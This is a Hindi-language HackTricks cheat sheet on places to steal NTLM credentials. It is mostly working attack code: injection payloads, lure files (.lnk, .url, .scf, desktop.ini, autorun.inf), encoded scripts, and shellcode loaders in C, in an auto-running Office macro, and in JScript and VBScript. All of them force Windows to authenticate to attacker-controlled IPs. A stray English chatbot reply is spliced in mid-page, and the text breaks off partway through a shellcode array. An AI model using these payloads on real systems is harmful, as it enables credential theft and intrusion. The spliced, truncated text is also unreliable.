# NTLM प्रमाण-पत्र चुराने के स्थान

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>

## स्वचालित पेलोड निर्माण और अन्य सूचियाँ

### [ntlm\_theft](https://github.com/Greenwolf/ntlm\_theft)

यह टूल **कई दस्तावेज़/फाइलें बनाएगा** जिन्हें यदि उपयोगकर्ता द्वारा किसी भी तरह से एक्सेस किया जाता है, तो वे **हमलावर के साथ NTLM प्रमाणीकरण शुरू कर देंगे**।

#### ntlm\_theft निम्नलिखित हमले प्रकारों का समर्थन करता है:

फोल्डर में ब्राउज़ करें जिसमें हो:

* .url – URL फील्ड के माध्यम से
* .url – ICONFILE फील्ड के माध्यम से
* .lnk - icon\_location फील्ड के माध्यम से
* .scf – ICONFILE फील्ड के माध्यम से (नवीनतम Windows पर काम नहीं करता)
* autorun.inf OPEN फील्ड के माध्यम से (नवीनतम Windows पर काम नहीं करता)
* desktop.ini - IconResource फील्ड के माध्यम से (नवीनतम Windows पर काम नहीं करता)

दस्तावेज़ खोलें:

* .xml – Microsoft Word बाहरी स्टाइलशीट के माध्यम से
* .xml – Microsoft Word includepicture फील्ड के माध्यम से
* .htm – Chrome & IE & Edge img src के माध्यम से (केवल यदि स्थानीय रूप से खोला गया हो, होस्ट नहीं किया गया हो)
* .docx – Microsoft Word includepicture फील्ड के माध्यम से

\-.docx – Microsoft Word बाहरी टेम्पलेट के माध्यम से

\-.docx – Microsoft Word frameset webSettings के माध्यम से

\-.xlsx - Microsoft Excel बाहरी सेल के माध्यम से

\-.wax - Windows Media Player प्लेलिस्ट के माध्यम से (बेहतर, प्राथमिक खोलें)

\-.asx – Windows Media Player प्लेलिस्ट के माध्यम से (बेहतर, प्राथमिक खोलें)

\-.m3u – Windows Media Player प्लेलिस्ट के माध्यम से (खराब, Win10 पहले Groovy में खोलता है)

\-.jnlp – Java बाहरी jar के माध्यम से

\-.application – किसी भी ब्राउज़र के माध्यम से (ब्राउज़र द्वारा डाउनलोड किया गया हो या नहीं चलेगा)

दस्तावेज़ खोलें और पॉपअप स्वीकार करें:

* .pdf – Adobe Acrobat Reader के माध्यम से

चैट प्रोग्राम में लिंक पर क्लिक करें:

* .txt – Zoom चैट में पेस्ट करने के लिए स्वरूपित लिंक

> उदाहरण :
>
> ```bash
> # python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
> Created: test/test.scf (BROWSE)
> Created: test/test-(url).url (BROWSE)
> Created: test/test-(icon).url (BROWSE)
> Created: test/test.rtf (OPEN)
> Created: test/test-(stylesheet).xml (OPEN)
> Created: test/test-(fulldocx).xml (OPEN)
> Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
> Created: test/test-(includepicture).docx (OPEN)
> Created: test/test-(remotetemplate).docx (OPEN)
> Created: test/test-(frameset).docx (OPEN)
> Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
> Created: test/test.asx (OPEN)
> Created: test/test.jnlp (OPEN)
> Created: test/test.application (DOWNLOAD AND OPEN)
> Created: test/test.pdf (OPEN AND ALLOW)
> Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
> Generation Complete.
> ```

### [All\_NTLM-Leak](https://github.com/Gl3bGl4z/All\_NTLM\_leak)

> चीटशीट

यह पीड़ित से प्रमाण-पत्र चुराने के लिए NTLM प्रमाणीकरण को मजबूर करने की तकनीकों की एक सूची है।

### NTLM विशेषाधिकार प्रमाणीकरण को मजबूर करें

आप एक विशेषाधिकार वाले खाते का उपयोग करके किसी विंडोज मशीन को किसी मनमानी मशीन पर प्रमाणीकरण करने के लिए मजबूर कर सकते हैं। अधिक जानने के लिए निम्नलिखित पृष्ठ पढ़ें:

{% content-ref url="../active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## LFI

PHP में include() हमारे लिए नेटवर्क पथ को हल करेगा।
```
http://host.tld/?page=//11.22.33.44/@OsandaMalith
```
## XXE

यहाँ मैं "php://filter/convert.base64-encode/resource=" का उपयोग कर रहा हूँ जो एक नेटवर्क पथ को हल करेगा।
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=//11.22.33.44/@OsandaMalith" >
]>
<root>
<name></name>
<tel></tel>
<email>OUT&xxe;OUT</email>
<password></password>
</root>
```
![](<../../.gitbook/assets/image (618).png>)

## XPath Injection

आमतौर पर, doc() का उपयोग out-of-band XPath injections में किया जाता है, इसलिए इसे नेटवर्क पथ को हल करने में लागू किया जा सकता है।
```
http://host.tld/?title=Foundation&type=*&rent_days=* and doc('//35.164.153.224/@OsandaMalith')
```
```markdown
![](<../../.gitbook/assets/image (638) (2).png>)

## MySQL Injection

मैंने MySQL आउट-ऑफ-बैंड इंजेक्शन पर एक पूरी [पोस्ट](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/) लिखी है जिसे इंटरनेट पर लागू किया जा सकता है। आप 'INTO OUTFILE' का उपयोग करके नेटवर्क पथ को हल कर सकते हैं।
```
```
http://host.tld/index.php?id=1’ union select 1,2,load_file(‘\\\\192.168.0.100\\@OsandaMalith’),4;%00
```
![](<../../.gitbook/assets/image (663).png>)

## MSSQL

चूंकि स्टैक्ड क्वेरीज का समर्थन किया जाता है, हम संग्रहीत प्रक्रियाओं को कॉल कर सकते हैं।
```
';declare @q varchar(99);set @q='\\192.168.254.52\test'; exec master.dbo.xp_dirtree @q
```
## Regsvr32

गलती से इसे .sct फाइलों के साथ प्रयोग करते समय खोजा गया।
```
regsvr32 /s /u /i://35.164.153.224/@OsandaMalith scrobj.dll
```
## Batch

आप जिन विभिन्न तरीकों का पता लगा सकते हैं
```
echo 1 > //192.168.0.1/abc
pushd \\192.168.0.1\abc
cmd /k \\192.168.0.1\abc
cmd /c \\192.168.0.1\abc
start \\192.168.0.1\abc
mkdir \\192.168.0.1\abc
type\\192.168.0.1\abc
dir\\192.168.0.1\abc
find, findstr, [x]copy, move, replace, del, rename and many more!
```
## ऑटो-कम्प्लीट

आपको केवल ‘\host\’ टाइप करना होता है, ऑटो-कम्प्लीट एक्सप्लोरर और रन डायलॉग बॉक्स के अंतर्गत चाल कर देगा।

![](<../../.gitbook/assets/image (660).png>)

![](<../../.gitbook/assets/image (637).png>)

## Autorun.inf

विंडोज 7 से शुरू होकर यह सुविधा अक्षम है। हालांकि, आप Autorun के लिए ग्रुप पॉलिसी बदलकर इसे सक्षम कर सकते हैं। Autorun.inf फाइल को छिपाना सुनिश्चित करें ताकि यह काम करे।
```
[autorun]
open=\\35.164.153.224\setup.exe
icon=something.ico
action=open Setup.exe
```
## शेल कमांड फाइलें

जब अप्रमाणित उपयोगकर्ताओं को लिखने की अनुमति दी जाती है, तो डोमेन उपयोगकर्ताओं के पासवर्ड हैशेज या शेल्स प्राप्त करना संभव है। SCF (शेल कमांड फाइलें) सीमित सेट के ऑपरेशन्स को प्रदर्शित कर सकती हैं जैसे कि विंडोज डेस्कटॉप दिखाना या विंडोज एक्सप्लोरर खोलना। नीचे दिए गए कोड को `ordinary.scf` के रूप में सेव करें और इसे नेटवर्क शेयर में डालें।
```
[Shell]
Command=2
IconFile=\\AttackerIP\ordinary.ico
[Taskbar]
Command=ToggleDesktop
```
## Desktop.ini

Desktop.ini फाइलें उस आइकन की जानकारी रखती हैं जिसे आपने फोल्डर पर लागू किया है। हम इसका दुरुपयोग नेटवर्क पथ को हल करने के लिए कर सकते हैं। एक बार जब आप फोल्डर खोलते हैं, आपको हैशेज मिलनी चाहिए।
```
mkdir openMe
attrib +s openMe
cd openMe
echo [.ShellClassInfo] > desktop.ini
echo IconResource=\\192.168.0.1\aa >> desktop.ini
attrib +s +h desktop.ini
```
Windows XP प्रणालियों में desktop.ini फ़ाइल 'IconResource' के बजाय 'IcondFile' का उपयोग करती है।
```
[.ShellClassInfo]
IconFile=\\192.168.0.1\aa
IconIndex=1337
```
## शॉर्टकट फाइलें (.lnk)

हम एक शॉर्टकट बना सकते हैं जिसमें हमारा नेटवर्क पथ होता है और जैसे ही आप शॉर्टकट खोलते हैं, Windows नेटवर्क पथ को हल करने की कोशिश करेगा। आप शॉर्टकट को ट्रिगर करने के लिए एक कीबोर्ड शॉर्टकट भी निर्दिष्ट कर सकते हैं। आइकन के लिए आप Windows बाइनरी का नाम दे सकते हैं या system32 डायरेक्टरी में स्थित shell32.dll, Ieframe.dll, imageres.dll, pnidui.dll या wmploc.dll में से किसी एक आइकन को चुन सकते हैं।
```powershell
Set shl = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
currentFolder = shl.CurrentDirectory

Set sc = shl.CreateShortcut(fso.BuildPath(currentFolder, "\StealMyHashes.lnk"))

sc.TargetPath = "\\35.164.153.224\@OsandaMalith"
sc.WindowStyle = 1
sc.HotKey = "Ctrl+Alt+O"
sc.IconLocation = "%windir%\system32\shell32.dll, 3"
sc.Description = "I will Steal your Hashes"
sc.Save
```
Powershell संस्करण।
```powershell
#TargetPath attack
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("StealMyHashes.lnk")
$lnk.TargetPath = "\\35.164.153.224\@OsandaMalith"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "I will Steal your Hashes"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()

#IconLocation Attack
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc\software\test.lnk")
$shortcut.IconLocation = "\\10.10.10.10\test.ico"
$shortcut.Save()
```
## इंटरनेट शॉर्टकट्स (.url)

विंडोज में एक और शॉर्टकट है जो इंटरनेट शॉर्टकट्स है। आप इसे something.url के रूप में सेव कर सकते हैं।
```bash
echo [InternetShortcut] > stealMyHashes.url
echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url
```
## रजिस्ट्री के साथ ऑटोरन

आप निम्नलिखित पथों में से किसी में भी एक नई रजिस्ट्री कुंजी जोड़ सकते हैं।
```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
```markdown
![](<../../.gitbook/assets/image (307) (5).png>)

## Powershell

Powershell में शायद कई स्क्रिप्टलेट होंगे जो एक नेटवर्क पथ को हल करेंगे।
```
```
Invoke-Item \\192.168.0.1\aa
Get-Content \\192.168.0.1\aa
Start-Process \\192.168.0.1\aa
```
## IE

IE UNC पथों को हल करेगा। उदाहरण के लिए
```html
<img src="\\\\192.168.0.1\\aa">
```
आप XSS के अंतर्गत या उन परिदृश्यों में इंजेक्ट कर सकते हैं जहाँ आपको SQL injection मिलता है। उदाहरण के लिए।
```
http://host.tld/?id=-1' union select 1,'<img src="\\\\192.168.0.1\\aa">';%00
```
## VBScript

आप इसे .vbs के रूप में सेव कर सकते हैं या इसे Word या Excel फाइलों में लागू किए गए मैक्रो के अंदर उपयोग कर सकते हैं।
```bash
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
```
आप वेब पेजेस में इसे लागू कर सकते हैं लेकिन यह केवल IE के साथ काम करता है।
```markup
<html>
<script type="text/Vbscript">
<!--
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
//-->
</script>
</html>
```
यहाँ एन्कोडेड संस्करण है। आप इसे एन्कोड करके something.vbe के रूप में सेव कर सकते हैं।
```
#@~^ZQAAAA==jY~6?}'ZM2mO2}4%+1YcEUmDb2YbxocorV?H/O+h6(LnmDE#=?nO,sksn{0dWcGa+U:+XYsbVcJJzf*cF*cF*2  yczmCE~8#XSAAAA==^#~@
```
आप इसे html फाइलों में भी लागू कर सकते हैं। लेकिन यह केवल IE के साथ काम करता है। आप इसे something.hta के रूप में सेव कर सकते हैं जो कि विंडोज के तहत एक HTML एप्लिकेशन होगा, जिसे mshta.exe निष्पादित करेगा। डिफ़ॉल्ट रूप से यह IE का उपयोग करता है।
```
<html>
<script type="text/Vbscript.Encode">
<!--
#@~^ZQAAAA==jY~6?}'ZM2mO2}4%+1YcEUmDb2YbxocorV?H/O+h6(LnmDE#=?nO,sksn{0dWcGa+U:+XYsbVcJJzf*cF*cF*2  yczmCE~8#XSAAAA==^#~@
//-->
</script>
</html>
```
## JScript

आप इसे windows के अंतर्गत something.js के रूप में सेव कर सकते हैं।
```javascript
var fso = new ActiveXObject("Scripting.FileSystemObject")
fso.FileExists("//192.168.0.103/aa")
```
आप यही क्रिया HTML फाइलों में भी लागू कर सकते हैं लेकिन यह केवल IE के साथ काम करता है। इसे something.hta के रूप में भी सेव कर सकते हैं।
```markup
<html>
<script type="text/Jscript">
<!--
var fso = new ActiveXObject("Scripting.FileSystemObject")
fso.FileExists("//192.168.0.103/aa")
//-->
</script>
</html>
```
यहाँ एन्कोडेड संस्करण है। आप इसे something.jse के रूप में सेव कर सकते हैं।
```
#@~^XAAAAA==-mD~6/K'xh,)mDk-+or8%mYvE?1DkaOrxTRwks+jzkYn:}8LmOE*i0dGcsrV3XkdD/vJzJFO+R8v0RZRqT2zlmE#Ux4AAA==^#~@
```
Since you've requested the HTML version of the markdown content, I will provide the translation within the HTML tags as requested. Please provide the specific content you need to be translated, and I will translate it accordingly while maintaining the HTML syntax and the instructions you've provided.
```markup
<html>
<script type="text/Jscript.Encode">
<!--
#@~^XAAAAA==-mD~6/K'xh,)mDk-+or8%mYvE?1DkaOrxTRwks+jzkYn:}8LmOE*i0dGcsrV3XkdD/vJzJFO+R8v0RZRqT2zlmE#Ux4AAA==^#~@
//-->
</script>
</html>
```
## विंडोज स्क्रिप्ट फाइलें

इसे something.wsf के रूप में सेव करें।
```markup
<package>
<job id="boom">
<script language="VBScript">
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
</script>
</job>
</package>
```
## शेलकोड

यहाँ एक छोटा शेलकोड है जो मैंने बनाया है। यह शेलकोड CreateFile का उपयोग करता है और एक अस्तित्वहीन नेटवर्क पथ को पढ़ने की कोशिश करता है। आप Responder जैसे उपकरणों का उपयोग करके NetNTLM हैशेज को कैप्चर कर सकते हैं। शेलकोड को इंटरनेट पर हैशेज चुराने के लिए संशोधित किया जा सकता है। SMBRelay हमले भी किए जा सकते हैं।
```cpp
/*
Title: CreateFile Shellcode
Author: Osanda Malith Jayathissa (@OsandaMalith)
Website: https://osandamalith.com
Size: 368 Bytes
*/
# include <stdlib.h>
# include <stdio.h>
# include <string.h>
# include <windows.h>

int main() {

char *shellcode =
"\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x4c\x03\x02\x02\x81\xf1\x02\x02"
"\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x05\x0f\x44\xc6\xaa"
"\xe2\xf6\xe8\x05\x05\x05\x05\x5e\x8b\xfe\x81\xc6\x29\x01\x05\x05"
"\xb9\x02\x05\x05\x05\xfc\xad\x01\x3c\x07\xe2\xfa\x56\xb9\x8d\x10"
"\xb7\xf8\xe8\x5f\x05\x05\x05\x68\x31\x01\x05\x05\xff\xd0\xb9\xe0"
"\x53\x31\x4b\xe8\x4e\x05\x05\x05\xb9\xac\xd5\xaa\x88\x8b\xf0\xe8"
"\x42\x05\x05\x05\x6a\x05\x68\x80\x05\x05\x05\x6a\x03\x6a\x05\x6a"
"\x01\x68\x05\x05\x05\x80\x68\x3e\x01\x05\x05\xff\xd0\x6a\x05\xff"
"\xd6\x33\xc0\x5e\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c\x61\x0f\xbe"
"\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0\x75\xea\x8b"
"\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53\x56\x57\x89"
"\x4d\xf4\x64\xa1\x30\x05\x05\x05\x89\x45\xfc\x8b\x45\xfc\x8b\x40"
"\x0c\x8b\x40\x14\x89\x45\xec\x8b\xf8\x8b\xcf\xe8\xd2\xff\xff\xff"
"\x8b\x70\x18\x8b\x3f\x85\xf6\x74\x4f\x8b\x46\x3c\x8b\x5c\x30\x78"
"\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff\xff\xff\x8b"
"\x4c\x33\x20\x89\x45\xf8\x33\xc0\x03\xce\x89\x4d\xf0\x89\x45\xfc"
"\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75\xff\xff\xff"
"\x03\x45\xf8\x39\x45\xf4\x74\x1c\x8b\x45\xfc\x8b\x4d\xf0\x40\x89"
"\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c\x33\xc0\x5f"
"\x5e\x5b\xc9\xc3\x8b\x4d\xfc\x8b\x44\x33\x24\x8d\x04\x48\x0f\xb7"
"\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04\x30\x03\xc6\xeb\xdf"
"\x21\x05\x05\x05\x50\x05\x05\x05\x6b\x65\x72\x6e\x65\x6c\x33\x32"
"\x2e\x64\x6c\x6c\x05\x2f\x2f\x65\x72\x72\x6f\x72\x2f\x61\x61\x05";

DWORD oldProtect;

wprintf(L"Length : %d bytes\n@OsandaMalith", strlen(shellcode));
BOOL ret = VirtualProtect (shellcode, strlen(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);

if (!ret) {
fprintf(stderr, "%s", "Error Occured");
return EXIT_FAILURE;
}

((void(*)(void))shellcode)();

VirtualProtect (shellcode, strlen(shellcode), oldProtect, &oldProtect);

return EXIT_SUCCESS;
}
```
## मैक्रोज़ के अंदर Shellcode

यहाँ ऊपर दिया गया shellcode Word/Excel मैक्रो के अंदर लागू किया गया है। आप इसी कोड को VB6 एप्लिकेशन के अंदर भी उपयोग कर सकते हैं।
```basic
' Author : Osanda Malith Jayathissa (@OsandaMalith)
' Title: Shellcode to request a non-existing network path
' Website: https://osandamalith
' Shellcode : https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
' This is a word/excel macro. This can be used in vb6 applications as well

#If Vba7 Then
Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
ByVal lpThreadAttributes As Long, _
ByVal dwStackSize As Long, _
ByVal lpStartAddress As LongPtr, _
lpParameter As Long, _
ByVal dwCreationFlags As Long, _
lpThreadId As Long) As LongPtr


Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
ByVal lpAddress As Long, _
ByVal dwSize As Long, _
ByVal flAllocationType As Long, _
ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
ByVal Destination  As LongPtr, _
ByRef Source As Any, _
ByVal Length As Long) As LongPtr

#Else
Private Declare Function CreateThread Lib "kernel32" ( _
ByVal lpThreadAttributes As Long, _
ByVal dwStackSize As Long, _
ByVal lpStartAddress As Long, _
lpParameter As Long, _
ByVal dwCreationFlags As Long, _
lpThreadId As Long) As Long

Private Declare Function VirtualAlloc Lib "kernel32" ( _
ByVal lpAddress As Long, _
ByVal dwSize As Long, _
ByVal flAllocationType As Long, _
ByVal flProtect As Long) As Long

Private Declare Function RtlMoveMemory Lib "kernel32" ( _
ByVal Destination As Long, _
ByRef Source As Any, _
ByVal Length As Long) As Long
#EndIf

Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40

Sub Auto_Open()
Dim source As Long, i As Long
#If Vba7 Then
Dim  lpMemory As LongPtr, lResult As LongPtr
#Else
Dim  lpMemory As Long, lResult As Long
#EndIf

Dim bShellcode(376) As Byte
bShellcode(0) = 232
bShellcode(1) = 255
bShellcode(2) = 255
bShellcode(3) = 255
bShellcode(4) = 255
bShellcode(5) = 192
bShellcode(6) = 95
bShellcode(7) = 185
bShellcode(8) = 85
bShellcode(9) = 3
bShellcode(10) = 2
bShellcode(11) = 2
bShellcode(12) = 129
bShellcode(13) = 241
bShellcode(14) = 2
bShellcode(15) = 2
bShellcode(16) = 2
.....................
lpMemory = VirtualAlloc(0, UBound(bShellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
For i = LBound(bShellcode) To UBound(bShellcode)
source = bShellcode(i)
lResult = RtlMoveMemory(lpMemory + i, source, 1)
Next i
lResult = CreateThread(0, 0, lpMemory, 0, 0, 0)
End Sub
Sub AutoOpen()
Auto_Open
End Sub
Sub Workbook_Open()
Auto_Open
End Sub
```
## Shellcode अंदर VBS और JS

subTee ने JS और DynamicWrapperX के साथ कई प्रकार के शोध किए हैं। आप DynamicWrapperX DLL का उपयोग करते हुए एक POC पा सकते हैं।\
[http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html](http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html)\
उसके आधार पर मैंने shellcode को JS और VBS में पोर्ट किया है। मजेदार बात यह है कि हम shellcode को JScript या VBScript में html और .hta प्रारूपों के अंदर एम्बेड कर सकते हैं।\
नोट करें कि निम्नलिखित shellcode मेरे IP की ओर निर्देशित है।

#### JScript
```javascript
/*
* Author : Osanda Malith Jayathissa (@OsandaMalith)
* Title: Shellcode to request a non-existing network path
* Website: https://osandamalith.com
* Shellcode : https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
* Based on subTee's JS: https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04
*/
DX = new ActiveXObject("DynamicWrapperX");
DX.Register("kernel32.dll", "VirtualAlloc", "i=luuu", "r=u");
DX.Register("kernel32.dll","CreateThread","i=uullu","r=u" );
DX.Register("kernel32.dll", "WaitForSingleObject", "i=uu", "r=u");

var MEM_COMMIT = 0x1000;
var PAGE_EXECUTE_READWRITE = 0x40;

var sc = [
0xe8, 0xff, 0xff, 0xff, 0xff, 0xc0, 0x5f, 0xb9, 0x55, 0x03, 0x02, 0x02, 0x81, 0xf1, 0x02, 0x02, 0x02, 0x02, 0x83, 0xc7,
0x1d, 0x33, 0xf6, 0xfc, 0x8a, 0x07, 0x3c, 0x05, 0x0f, 0x44, 0xc6, 0xaa, 0xe2, 0xf6, 0xe8, 0x05, 0x05, 0x05, 0x05, 0x5e,
0x8b, 0xfe, 0x81, 0xc6, 0x29, 0x01, 0x05, 0x05, 0xb9, 0x02, 0x05, 0x05, 0x05, 0xfc, 0xad, 0x01, 0x3c, 0x07, 0xe2, 0xfa,
0x56, 0xb9, 0x8d, 0x10, 0xb7, 0xf8, 0xe8, 0x5f, 0x05, 0x05, 0x05, 0x68, 0x31, 0x01, 0x05, 0x05, 0xff, 0xd0, 0xb9, 0xe0,
0x53, 0x31, 0x4b, 0xe8, 0x4e, 0x05, 0x05, 0x05, 0xb9, 0xac, 0xd5, 0xaa, 0x88, 0x8b, 0xf0, 0xe8, 0x42, 0x05, 0x05, 0x05,
0x6a, 0x05, 0x68, 0x80, 0x05, 0x05, 0x05, 0x6a, 0x03, 0x6a, 0x05, 0x6a, 0x01, 0x68, 0x05, 0x05, 0x05, 0x80, 0x68, 0x3e,
0x01, 0x05, 0x05, 0xff, 0xd0, 0x6a, 0x05, 0xff, 0xd6, 0x33, 0xc0, 0x5e, 0xc3, 0x33, 0xd2, 0xeb, 0x10, 0xc1, 0xca, 0x0d,
0x3c, 0x61, 0x0f, 0xbe, 0xc0, 0x7c, 0x03, 0x83, 0xe8, 0x20, 0x03, 0xd0, 0x41, 0x8a, 0x01, 0x84, 0xc0, 0x75, 0xea, 0x8b,
0xc2, 0xc3, 0x8d, 0x41, 0xf8, 0xc3, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x14, 0x53, 0x56, 0x57, 0x89, 0x4d, 0xf4, 0x64, 0xa1,
0x30, 0x05, 0x05, 0x05, 0x89, 0x45, 0xfc, 0x8b, 0x45, 0xfc, 0x8b, 0x40, 0x0c, 0x8b, 0x40, 0x14, 0x89, 0x45, 0xec, 0x8b,
0xf8, 0x8b, 0xcf, 0xe8, 0xd2, 0xff, 0xff, 0xff, 0x8b, 0x70, 0x18, 0x8b, 0x3f, 0x85, 0xf6, 0x74, 0x4f, 0x8b, 0x46, 0x3c,
0x8b, 0x5c, 0x30, 0x78, 0x85, 0xdb, 0x74, 0x44, 0x8b, 0x4c, 0x33, 0x0c, 0x03, 0xce, 0xe8, 0x96, 0xff, 0xff, 0xff, 0x8b,
0x4c, 0x33, 0x20, 0x89, 0x45, 0xf8, 0x33, 0xc0, 0x03, 0xce, 0x89, 0x4d, 0xf0, 0x89, 0x45, 0xfc, 0x39, 0x44, 0x33, 0x18,
0x76, 0x22, 0x8b, 0x0c, 0x81, 0x03, 0xce, 0xe8, 0x75, 0xff, 0xff, 0xff, 0x03, 0x45, 0xf8, 0x39, 0x45, 0xf4, 0x74, 0x1c,
0x8b, 0x45, 0xfc, 0x8b, 0x4d, 0xf0, 0x40, 0x89, 0x45, 0xfc, 0x3b, 0x44, 0x33, 0x18, 0x72, 0xde, 0x3b, 0x7d, 0xec, 0x75,
0x9c, 0x33, 0xc0, 0x5f, 0x5e, 0x5b, 0xc9, 0xc3, 0x8b, 0x4d, 0xfc, 0x8b, 0x44, 0x33, 0x24, 0x8d, 0x04, 0x48, 0x0f, 0xb7,
0x0c, 0x30, 0x8b, 0x44, 0x33, 0x1c, 0x8d, 0x04, 0x88, 0x8b, 0x04, 0x30, 0x03, 0xc6, 0xeb, 0xdf, 0x21, 0x05, 0x05, 0x05,
0x50, 0x05, 0x05, 0x05, 0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x05, 0x2f, 0x2f, 0x33,
0x35, 0x2e, 0x31, 0x36, 0x34, 0x2e, 0x31, 0x35, 0x33, 0x2e, 0x32, 0x32, 0x34, 0x2f, 0x61, 0x61, 0x05];

var scLocation = DX.VirtualAlloc(0, sc.length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
for(var i = 0; i < sc.length; i++) DX.NumPut(sc[i],scLocation,i);
var thread = DX.CreateThread(0,0,scLocation,0,0);
```
#### VBScript
```vba
' Author : Osanda Malith Jayathissa (@OsandaMalith)
' Title: Shellcode to request a non-existing network path
' Website: https://osandamalith.com
' Shellcode : https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
' Based on subTee's JS: https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04

Set DX = CreateObject("DynamicWrapperX")
DX.Register "kernel32.dll", "VirtualAlloc", "i=luuu", "r=u"
DX.Register "kernel32.dll","CreateThread","i=uullu","r=u"
DX.Register "kernel32.dll", "WaitForSingleObject", "i=uu", "r=u"

Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40

shellcode = Array( _
&He8, &Hff, &Hff, &Hff, &Hff, &Hc0, &H5f, &Hb9, &H55, &H03, &H02, &H02, &H81, &Hf1, &H02, &H02, &H02, &H02, &H83, &Hc7, _
&H1d, &H33, &Hf6, &Hfc, &H8a, &H07, &H3c, &H05, &H0f, &H44, &Hc6, &Haa, &He2, &Hf6, &He8, &H05, &H05, &H05, &H05, &H5e, _
&H8b, &Hfe, &H81, &Hc6, &H29, &H01, &H05, &H05, &Hb9, &H02, &H05, &H05, &H05, &Hfc, &Had, &H01, &H3c, &H07, &He2, &Hfa, _
&H56, &Hb9, &H8d, &H10, &Hb7, &Hf8, &He8, &H5f, &H05, &H05, &H05, &H68, &H31, &H01, &H05, &H05, &Hff, &Hd0, &Hb9, &He0, _
&H53, &H31, &H4b, &He8, &H4e, &H05, &H05, &H05, &Hb9, &Hac, &Hd5, &Haa, &H88, &H8b, &Hf0, &He8, &H42, &H05, &H05, &H05, _
&H6a, &H05, &H68, &H80, &H05, &H05, &H05, &H6a, &H03, &H6a, &H05, &H6a, &H01, &H68, &H05, &H05, &H05, &H80, &H68, &H3e, _
&H01, &H05, &H05, &Hff, &Hd0, &H6a, &H05, &Hff, &Hd6, &H33, &Hc0, &H5e, &Hc3, &H33, &Hd2, &Heb, &H10, &Hc1, &Hca, &H0d, _
&H3c, &H61, &H0f, &Hbe, &Hc0, &H7c, &H03, &H83, &He8, &H20, &H03, &Hd0, &H41, &H8a, &H01, &H84, &Hc0, &H75, &Hea, &H8b, _
